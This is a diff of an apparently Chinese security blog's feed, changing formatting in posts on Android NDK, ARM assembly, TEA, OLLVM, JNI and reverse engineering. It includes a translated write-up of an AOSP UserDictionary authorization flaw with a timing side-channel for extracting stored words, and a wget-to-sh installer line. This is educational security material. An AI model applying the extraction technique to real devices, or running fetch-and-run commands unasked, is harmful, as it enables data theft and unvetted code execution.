   创建jni文件夹，添加 Android.mk和 Application.mk两个文件。（参考官方文档）
-//Android.mkLOCAL_PATH := $(call my-dir)include $(CLEAR_VARS)# 要生成的.so库名称LOCAL_MODULE := hello# c++文件LOCAL_SRC_FILES := hello.cppinclude $(BUILD_SHARED_LIBRARY)//Application.mkAPP_PLATFORM := android-17# APP_ABI := allAPP_ABI :=armeabi-v7a arm64-v8a添加hello.cpp：
-#include&amp;lt;cstdio&amp;gt;int i,j;int num[] = {1,2,3,4,5};int main(){/* code */printf(&amp;#34;hello,world!\n&amp;#34;);for(i=0;i&amp;lt;5;i++){printf(&amp;#34;num value is %d\n&amp;#34;,num[i]);}return 0;}  ndk-build</description>
+//Android.mk LOCAL_PATH := $(call my-dir) include $(CLEAR_VARS) # 要生成的.so库名称 LOCAL_MODULE := hello # c++文件 LOCAL_SRC_FILES := hello.cpp include $(BUILD_SHARED_LIBRARY) //Application.mk APP_PLATFORM := android-17 # APP_ABI := all APP_ABI :=armeabi-v7a arm64-v8a 添加hello.cpp：
+#include&amp;lt;cstdio&amp;gt;int i,j; int num[] = {1,2,3,4,5}; int main() { /* code */ printf(&amp;#34;hello,world!\n&amp;#34;); for(i=0;i&amp;lt;5;i++){ printf(&amp;#34;num value is %d\n&amp;#34;,num[i]); } return 0; }   ndk-build</description>
             <content type="html"><![CDATA[<p>学习一些关于ARM的汇编结构特点，以及分析。理解一些结构最好的方法就是多去尝试动手做。。</p>
 <h3 id="ndk-build的使用">NDK-Build的使用</h3>
 <p>可以参考<a href="https://developer.android.com/ndk/guides/ndk-build?hl=zh-cn">官方文档</a>。</p>
@@ -3085,7 +3085,7 @@ APP_PLATFORM <span style="color:#f92672">:=</span> android-17
 <span style="color:#75715e"># APP_ABI := all
 </span><span style="color:#75715e"></span>APP_ABI <span style="color:#f92672">:=</span>armeabi-v7a arm64-v8a
 </code></pre></div><p>添加hello.cpp：</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cpp" data-lang="cpp"><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;cstdio&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">int</span> i,j;
 <span style="color:#66d9ef">int</span> num[] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">1</span>,<span style="color:#ae81ff">2</span>,<span style="color:#ae81ff">3</span>,<span style="color:#ae81ff">4</span>,<span style="color:#ae81ff">5</span>};
 <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
@@ -3136,7 +3136,7 @@ APP_PLATFORM <span style="color:#f92672">:=</span> android-17
             <description>TEA加密与解密  TEA算法由剑桥大学计算机实验室的David Wheeler和Roger Needham于1994年发明。它是一种分组密码算法，其明文密文块为64比特，密钥长度为128比特。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的迭代次数可以改变，建议的迭代次数为32轮。
  在游戏项目中，一般需要对资源或数据进行加密保护，最简单高效的加密算法就是采用位与或之类的，但是比较容易被人分析出来。 TEA加密算法不但比较简单，而且有很强的抗差分分析能力，加密速度也比较快。可以根据项目需求设置加密轮数来增加加密强度。主要运用了移位和异或运算。密钥在加密过程中始终不变。
  差分分析是一种选择明文攻击，其基本思想是：通过分析特定明文差分对相对应密文差分影响来获得尽可能大的密钥。它可以用来攻击任何由迭代一个固定的轮函数的结构的密码以及很多分组密码（包括DES），它是由Biham和Shamir于1991年提出的选择明文攻击。
-  加密核心函数  void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key){unsigned int y = *firstChunk;unsigned int z = *secondChunk;unsigned int sum = 0;unsigned int delta = 0x9e3779b9;for (int i = 0; i &amp;lt; 8; i++) //8轮运算(需要对应下面的解密核心函数的轮数一样) {sum += delta;y += ((z &amp;lt;&amp;lt; 4) + key[0]) ^ (z + sum) ^ ((z &amp;gt;&amp;gt; 5) + key[1]);z += ((y &amp;lt;&amp;lt; 4) + key[2]) ^ (y + sum) ^ ((y &amp;gt;&amp;gt; 5) + key[3]);}*firstChunk = y;*secondChunk = z;} 算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」&amp;ndash;&amp;gt; delta = 0x9e3779b9;</description>
+  加密核心函数  void EncryptTEA(unsigned int *firstChunk, unsigned int *secondChunk, unsigned int* key) { unsigned int y = *firstChunk; unsigned int z = *secondChunk; unsigned int sum = 0; unsigned int delta = 0x9e3779b9; for (int i = 0; i &amp;lt; 8; i++) //8轮运算(需要对应下面的解密核心函数的轮数一样)  { sum += delta; y += ((z &amp;lt;&amp;lt; 4) + key[0]) ^ (z + sum) ^ ((z &amp;gt;&amp;gt; 5) + key[1]); z += ((y &amp;lt;&amp;lt; 4) + key[2]) ^ (y + sum) ^ ((y &amp;gt;&amp;gt; 5) + key[3]); } *firstChunk = y; *secondChunk = z; }  算法使用了一个神秘常数δ作为倍数，它来源于黄金比率，以保证每一轮加密都不相同。但δ的精确值似乎并不重要，这里 TEA 把它定义为 δ=「(√5 - 1)231」&amp;ndash;&amp;gt; delta = 0x9e3779b9;</description>
             <content type="html"><![CDATA[<h2 id="tea加密与解密">TEA加密与解密</h2>
 <blockquote>
 <p><a href="https://baike.baidu.com/item/TEA%E7%AE%97%E6%B3%95/10167844">TEA算法</a>由<a href="https://baike.baidu.com/item/%E5%89%91%E6%A1%A5%E5%A4%A7%E5%AD%A6/278542">剑桥大学</a>计算机实验室的David Wheeler和Roger Needham于1994年发明。它是一种分组<a href="https://baike.baidu.com/item/%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95">密码算法</a>，其明文密文块为64比特，<a href="https://baike.baidu.com/item/%E5%AF%86%E9%92%A5">密钥</a>长度为128比特。TEA算法利用不断增加的Delta(黄金分割率)值作为变化，使得每轮的加密是不同，该加密算法的<a href="https://baike.baidu.com/item/%E8%BF%AD%E4%BB%A3">迭代</a>次数可以改变，建议的迭代次数为32轮。</p>
@@ -3208,7 +3208,7 @@ APP_PLATFORM <span style="color:#f92672">:=</span> android-17
 OLLVM的混淆操作在IR层，通过编写Pass来混淆IR，以致后端生成的目标代码也被混淆了。
 OLLVM-Android环境搭建 前提环境：
  NDK环境 LLVM  下载源码(包括了LLVM和Clang)-编译OLLVM步骤如下：
- $ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git$ mkdir build$ cd build$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator///（cmake -G &amp;#34;MinGW Makefiles&amp;#34; -DCMAKE_BUILD_TYPE=Release ../obfuscator/）(windows)$ make -j7 //这个数字自己看自己CPU填 太小可能非常编译慢  可以参照官方wiki来操作。编译完成后，二进制文件放在build/bin目录下。
+ $ git clone -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git $ mkdir build $ cd build $ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/ //（cmake -G &amp;#34;MinGW Makefiles&amp;#34; -DCMAKE_BUILD_TYPE=Release ../obfuscator/）(windows) $ make -j7 //这个数字自己看自己CPU填 太小可能非常编译慢  可以参照官方wiki来操作。编译完成后，二进制文件放在build/bin目录下。
 配置整合NDK：
   打开NDK目录ndk-bundle下的toolchains，新建obfuscator-llvm-4，将llvm文件夹里的所有文件复制到新建的目录下。</description>
             <content type="html"><![CDATA[<h3 id="ollvm">OLLVM</h3>
@@ -3861,7 +3861,7 @@ adb shell am start -D -n 包名/.MainActivity
 内容主要来源于《Android软件安全与逆向分析》和《逆向工程权威指南》以及 ARM 汇编 和Azeria-labs
 ARM架构 ARM属于RISC CPU，
  ARM模式 4个字节opcode 32位 Thumb模式 2个字节opcode 16位 Thumb-2模式 同上（只是有部分4个字节的opcode) 64位ARM 4个字节opcode ARM机器码在版本3之前是小端。但是之后默认采用大端格式，但可以设置切换到小端。  数据类型 数据类型在汇编语言中的扩展后缀为**-h**或者**-sh**对应着半字，**-b**或者**-sb**对应着字节，但是对于字并没有对应的扩展
-ldr = 加载字，宽度四字节ldrh = 加载无符号的半字，宽度两字节ldrsh = 加载有符号的半字，宽度两字节ldrb = 加载无符号的字节ldrsb = 加载有符号的字节str = 存储字，宽度四字节strh = 存储无符号的半字，宽度两字节strsh = 存储有符号的半字，宽度两字节strb = 存储无符号的字节strsb = 存储有符号的字节字节序 在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。
+ldr = 加载字，宽度四字节 ldrh = 加载无符号的半字，宽度两字节 ldrsh = 加载有符号的半字，宽度两字节 ldrb = 加载无符号的字节 ldrsb = 加载有符号的字节 str = 存储字，宽度四字节 strh = 存储无符号的半字，宽度两字节 strsh = 存储有符号的半字，宽度两字节 strb = 存储无符号的字节 strsb = 存储有符号的字节 字节序 在内存中有两种字节排布顺序，大端序(BE)或者小端序(LE)。两者的主要不同是对象中的每个字节在内存中的存储顺序存在差异。一般X86中是小端序，最低的字节存储在最低的地址上。在大端机中最高的字节存储在最低的地址上。
 数据访问时采取大端序还是小端序使用程序状态寄存器(CPSR)的第9比特位来决定的。
 寄存器 37个32位寄存器，其中31个为基础寄存器，6个为状态寄存器。
 用户模式下有
@@ -4281,12 +4281,12 @@ _start:
  <span style="color:#a6e22e">bkpt</span>
 </code></pre></div><p>计算立即数的有效值脚本：https://raw.githubusercontent.com/azeria-labs/rotator/master/rotator.py</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">azeria@labs:~$ python rotator.py
-Enter the value you want to check: 511
+Enter the value you want to check: <span style="color:#ae81ff">511</span>
 Sorry, <span style="color:#ae81ff">511</span> cannot be used as an immediate number and has to be split.
 azeria@labs:~$ python rotator.py
-Enter the value you want to check: 256
+Enter the value you want to check: <span style="color:#ae81ff">256</span>
 The number <span style="color:#ae81ff">256</span> can be used as a valid immediate number.
-<span style="color:#ae81ff">1</span> ror <span style="color:#ae81ff">24</span> --&gt; 256
+<span style="color:#ae81ff">1</span> ror <span style="color:#ae81ff">24</span> --&gt; <span style="color:#ae81ff">256</span>
 </code></pre></div></li>
 </ul>
 <p>下面的部分指令用到在详细查，记的话脑壳痛</p>
@@ -4434,7 +4434,7 @@ make
 我们可以检查AOSP代码库，查看一个变更[2]中引入了一个新的名为canCallerAccessUserDictionary 的私有函数，并从 UserDictionary 内容提供者中的所有标准查询、插入、更新和删除函数中调用该函数，以防止对这些函数的未经授权的调用。
 虽然更改似乎对查询和插入函数都有效，但是在更新和删除过程中，授权检查发生滞后引入了安全漏洞，允许任何应用程序通过公开的内容提供者成功地调用受影响的函数，从而绕过错误的授权检查。
 在下面的 UserDictionaryProvider类[3]的代码中，注意高亮（标注在注释）的片段，查看在数据库已经被修改之后如何执行授权检查：
-@Overridepublic int delete(Uri uri, String where, String[] whereArgs) {SQLiteDatabase db = mOpenHelper.</description>
+@Override public int delete(Uri uri, String where, String[] whereArgs) { SQLiteDatabase db = mOpenHelper.</description>
             <content type="html"><![CDATA[<blockquote>
 <p>翻译的文章 渣渣翻译
 原作者：Daniel Kachakil</p>
@@ -4514,7 +4514,7 @@ make
 </span><span style="color:#75715e"></span><span style="color:#f92672">+</span> <span style="color:#f92672">(!</span>TextUtils<span style="color:#f92672">.</span><span style="color:#a6e22e">isEmpty</span><span style="color:#f92672">(</span>where<span style="color:#f92672">)</span> <span style="color:#f92672">?</span> <span style="color:#e6db74">&#34; AND (&#34;</span> <span style="color:#f92672">+</span> where <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;)&#39;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">),</span> whereArgs<span style="color:#f92672">);</span>
          <span style="color:#66d9ef">break</span><span style="color:#f92672">;</span>
 
-      <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
+      default:
          <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> IllegalArgumentException<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;Unknown URI &#34;</span> <span style="color:#f92672">+</span> uri<span style="color:#f92672">);</span>
    <span style="color:#f92672">}</span>
 
@@ -4577,7 +4577,7 @@ values<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span>
 </code></pre></div><p>如果条件为真，那么带有标识符“N”的行会将以一种不会改变其标识符的方式进行更新，因为它将被设置为其原始值，而行则保持不变。这是一种非侵入性的方法，使用执行时间作为侧通道oracle来提取数据。</p>
 <p>因为我们可以用任何子SELECT语句替换上面的条件，所以这种攻击可以扩展到查询SQLite中支持的任何SQL表达式，例如：</p>
 <ul>
-<li>&lsquo;something'这个词存储在字典里吗？</li>
+<li>&lsquo;something&rsquo;这个词存储在字典里吗？</li>
 <li>检索所有16个字符的单词（如信用卡号）</li>
 <li>检索所有有快捷方式的单词</li>
 <li>检索包含一个点的所有单词</li>
@@ -4683,11 +4683,11 @@ After the fix, the equivalent contents can be found in the following commit:
 作用？  1.在运行时判断任意一个对象所属的类； 2.在运行时构造任意一个类的对象； 3.在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）； 4.在运行时调用任意一个对象的方法  是运行时而不是编译时  获取某些类的一些变量，调用某些类的私有方法。 增加代码的灵活性。很多主流框架都使用了反射技术.像ssh框架都采用两种技术 xml做配置文件+反射技术.  基本使用 反射相关的类一般都在java.lang.relfect 包里。
   获取Class对象 3种方法
 (1)使用Class类的forName静态方法:
-public static Class&amp;lt;?&amp;gt; forName(String className)//在JDBC开发中常用此方法加载数据库驱动:Class.forName(driver);(2)直接获取某一个对象的class，比如:
-Class&amp;lt;?&amp;gt; klass = int.class;Class&amp;lt;?&amp;gt; classInt = Integer.TYPE;(3)调用某个对象的getClass()方法,比如:
-StringBuilder str = new StringBuilder(&amp;#34;123&amp;#34;);Class&amp;lt;?&amp;gt; klass = str.getClass();  判断是否为某一个类的实例
+public static Class&amp;lt;?&amp;gt; forName(String className) //在JDBC开发中常用此方法加载数据库驱动: Class.forName(driver); (2)直接获取某一个对象的class，比如:
+Class&amp;lt;?&amp;gt; klass = int.class; Class&amp;lt;?&amp;gt; classInt = Integer.TYPE; (3)调用某个对象的getClass()方法,比如:
+StringBuilder str = new StringBuilder(&amp;#34;123&amp;#34;); Class&amp;lt;?&amp;gt; klass = str.getClass();   判断是否为某一个类的实例
 一般使用instanceof来判断，也可以借助反射中的Class对象的isInstance()方法来判断 是一个Native方法：
-public native boolean isInstance(Object obj);  创建实例
+public native boolean isInstance(Object obj);   创建实例
 通过放射来生成对象两种方式：</description>
             <content type="html"><![CDATA[<h2 id="java-反射机制学习记录">Java 反射机制学习记录</h2>
 <p>在逆向中反射也是能经常看见，之前理解不是很深透，现在来重点学习一下，做个笔记。</p>
@@ -5477,7 +5477,7 @@ adb pull /sdcard/tmp.png D:\
             <guid>https://kuekiko.top/posts/2018/07/android%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4%E5%92%8C%E9%80%86%E5%90%91%E5%88%86%E6%9E%90-%E5%9F%BA%E7%A1%80%E7%AF%87/</guid>
             <description>一、 基础篇② 第二章 Android中NDK的开发 1. 相关环境 相关环境参考另外一篇文章Android安全和开发环境搭建
 2. JNI基础 2.1 第一行代码(书上使用Eclipse,我使用AS(简单方便很多)) ​	参考文章Android安全和开发环境搭建中的JNI开发章节
-2.2 JNIEnv类型和jobject类型  AS 默认自动生成  public native String stringFromJNI();Java_com_naivete_jni_1study_MainActivity_stringFromJNI(JNIEnv *env,jobject /* this */) {std::string hello = &amp;#34;Hello from C++&amp;#34;;return env-&amp;gt;NewStringUTF(hello.c_str());  JNIEnv类型
+2.2 JNIEnv类型和jobject类型  AS 默认自动生成  public native String stringFromJNI(); Java_com_naivete_jni_1study_MainActivity_stringFromJNI( JNIEnv *env, jobject /* this */) { std::string hello = &amp;#34;Hello from C++&amp;#34;; return env-&amp;gt;NewStringUTF(hello.c_str());   JNIEnv类型
 通过JNIEnv* 指针就可以对Java端的代码进行操作
 Jni的所有函数可以查看jni.h文件
 下面是一些函数eg：
@@ -5790,7 +5790,7 @@ Java_com_naivete_jni_1study_Hello_test(JNIEnv <span style="color:#f92672">*</spa
 
 </code></pre></div><p>1）在C++中使用第一种方法调用function方法：</p>
 <p><code>env-&gt;CallbooleanMethod(obj,id_function,10L，3.4，L'a')</code></p>
-<p>obj:functon对象，id_function:functiond的id,10L、3.4、L&rsquo;a'是对应的参数。</p>
+<p>obj:functon对象，id_function:functiond的id,10L、3.4、L&rsquo;a&rsquo;是对应的参数。</p>
 <p>L&rsquo;a&rsquo; 中的L是因为Java中的字符是Unicode双字节的，而C++中的字节是单字节的，所以要变成宽字符。</p>
 <p>2）在C++中使用第三种方法function调用：</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++">jvalue<span style="color:#f92672">*</span> args <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> Jvalue[<span style="color:#ae81ff">3</span>]
@@ -5917,10 +5917,10 @@ env<span style="color:#f92672">-&gt;</span>GetBooleanMethod(obj,id_function,args
 
     <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">callCppFunction</span><span style="color:#f92672">();</span>
 <span style="color:#f92672">}</span>
-</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;jni.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;algorithm&gt;</span><span style="color:#75715e">
+</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-C++" data-lang="C++"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;jni.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;iostream&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span><span style="color:#75715e">&lt;algorithm&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">using</span> <span style="color:#66d9ef">namespace</span> std;
 
 <span style="color:#66d9ef">extern</span> <span style="color:#e6db74">&#34;C&#34;</span>
@@ -6139,7 +6139,7 @@ JNIEXPORT <span style="color:#66d9ef">void</span> JNICALL Java_<span style="colo
             <description>第一章 Android中锁屏密码加密算法分析 1. 锁屏密码方式：  手势 九宫格连线 输入密码 指纹、人脸、虹膜 可穿戴设备  2. 这儿分析手势密码和输入密码 找到android源代码中的LockPatternUtils,java 这个工具类
 路径：Android-5.1.1\frameworks\base\core\java\com\android\internal\widget
  2.1 输入密码算法分析 (5.1版本的源代码 和书上细微差异)
- public byte[] passwordToHash(String password, int userId) {//参数为密码和对应用户ID 默认0 if (password == null) {return null;}try {byte[] saltedPassword = (password + getSalt(userId)).getBytes(); byte[] sha1 = MessageDigest.getInstance(&amp;#34;SHA-1&amp;#34;).digest(saltedPassword);byte[] md5 = MessageDigest.getInstance(&amp;#34;MD5&amp;#34;).digest(saltedPassword);//首先让 password+salt值 再SHA-1和MD5 byte[] combined = new byte[sha1.length + md5.length];System.arraycopy(sha1, 0, combined, 0, sha1.</description>
+ public byte[] passwordToHash(String password, int userId) {//参数为密码和对应用户ID 默认0  if (password == null) { return null; } try { byte[] saltedPassword = (password + getSalt(userId)).getBytes(); byte[] sha1 = MessageDigest.getInstance(&amp;#34;SHA-1&amp;#34;).digest(saltedPassword); byte[] md5 = MessageDigest.getInstance(&amp;#34;MD5&amp;#34;).digest(saltedPassword); //首先让 password+salt值 再SHA-1和MD5  byte[] combined = new byte[sha1.length + md5.length]; System.arraycopy(sha1, 0, combined, 0, sha1.</description>
             <content type="html"><![CDATA[<h2 id="第一章-android中锁屏密码加密算法分析">第一章 Android中锁屏密码加密算法分析</h2>
 <h4 id="1-锁屏密码方式">1. 锁屏密码方式：</h4>
 <ul>
@@ -6375,7 +6375,7 @@ via wget: sh -c &amp;quot;$(wget https://raw.githubusercontent.com/robbyrussell/
   GDB装上+pwndbg+peda+gef
 wsl的ubuntu不支持x86，所以主要只能调试x64的程序，而且可能会出现莫名其妙的错误。
 不过可以使用qemu来运行x86的程序，调试还是不行会出错。参考
-sudo apt updatesudo apt install qemu-user-staticsudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic &amp;#39;\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00&amp;#39; --mask &amp;#39;\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff&amp;#39;# 运行下面的一条命令就行跑x86 不过每次打开wsl都得运行一次，很麻烦，可以写脚本自动开启。sudo service binfmt-support start  pwndbg+peda+gef</description>
+sudo apt update sudo apt install qemu-user-static sudo update-binfmts --install i386 /usr/bin/qemu-i386-static --magic &amp;#39;\x7fELF\x01\x01\x01\x03\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x03\x00\x01\x00\x00\x00&amp;#39; --mask &amp;#39;\xff\xff\xff\xff\xff\xff\xff\xfc\xff\xff\xff\xff\xff\xff\xff\xff\xf8\xff\xff\xff\xff\xff\xff\xff&amp;#39; # 运行下面的一条命令就行跑x86 不过每次打开wsl都得运行一次，很麻烦，可以写脚本自动开启。 sudo service binfmt-support start   pwndbg+peda+gef</description>
             <content type="html"><![CDATA[<blockquote>
 <p>用来不时记录平时所用环境配置，以及遇到的各种问题以及解决办法。主要是为了防丢失，以及总是和空气斗志斗勇。</p>
 </blockquote>
